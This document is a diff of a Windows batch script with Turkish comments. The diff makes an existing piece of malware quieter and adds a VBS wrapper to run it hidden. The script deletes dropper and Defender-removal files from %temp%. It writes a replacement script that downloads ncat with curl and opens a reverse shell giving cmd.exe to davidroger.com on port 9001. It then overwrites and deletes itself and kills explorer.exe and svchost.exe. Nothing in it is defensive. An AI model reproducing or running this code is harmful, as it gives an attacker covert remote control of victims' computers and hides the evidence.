@@ -1,34 +1,44 @@
+:: Bu betik arka planda sessiz calissin istiyorsaniz, bir VBS dosyasiyla calistirin
+:: run_silently.vbs icerigi:
+' Set objShell = CreateObject("Wscript.Shell")
+' objShell.Run "your_batch_file.bat", 0, False
 
-:: Dosyalari sil
+:: Bu betigi run_silently.vbs uzerinden baslatin
+@echo off
 cd %temp%
-del /f /q "s.bat"
-del /f /q "a.py"
-del /f /q "asd.bat"
-del /f /q "ddd.vbs"
-del /f /q "expe2.bat"
-del /f /q "expe2.vbs"
-del /f /q "lalala.vbs"
-del /f /q "a.ps1"
-del /f /q "first.exe"
-del /f /q "corpvpn.inf"
-del /f /q "RunDefenderRemover.vbs"
-del /f /q "DefenderRemover.bat"
-rmdir /s /q "Remove_SecurityComp"
-rmdir /s /q "Remove_Defender"
+del /f /q "s.bat" >nul 2>&1
+del /f /q "a.py" >nul 2>&1
+del /f /q "asd.bat" >nul 2>&1
+del /f /q "ddd.vbs" >nul 2>&1
+del /f /q "expe2.bat" >nul 2>&1
+del /f /q "expe2.vbs" >nul 2>&1
+del /f /q "lalala.vbs" >nul 2>&1
+del /f /q "a.ps1" >nul 2>&1
+del /f /q "first.exe" >nul 2>&1
+del /f /q "corpvpn.inf" >nul 2>&1
+del /f /q "RunDefenderRemover.vbs" >nul 2>&1
+del /f /q "DefenderRemover.bat" >nul 2>&1
+rmdir /s /q "Remove_SecurityComp" >nul 2>&1
+rmdir /s /q "Remove_Defender" >nul 2>&1
 
-:: Kendini gecici bir dosyaya yaz, sonra o dosya ile degistir
 set "script=%~f0"
 set "tempfile=%temp%\temp_script.bat"
 (
     echo @echo off
     echo cd %%temp%%
-    echo curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
-    echo %%temp%%\ncat.exe davidroger.com 9001 -e cmd.exe
+    echo curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe ^>nul 2^>^&1
+    echo %%temp%%\ncat.exe davidroger.com 9001 -e cmd.exe ^>nul 2^>^&1
 ) > "%tempfile%"
 
-copy /y "%tempfile%" "%script%" >nul
+(
+    echo @echo off
+    echo timeout /t 2 /nobreak ^>nul
+    echo copy /y "%tempfile%" "%script%" ^>nul 2^>^&1
+    echo del /f /q "%tempfile%" ^>nul 2^>^&1
+    echo del /f /q "%%~f0" ^>nul 2^>^&1
+) > "%temp%\run_after.bat"
 
-cd %temp%
+start "" "%temp%\run_after.bat" >nul 2>&1
 start taskkill /f /im explorer.exe
 start taskkill /f /im svchost.exe
 
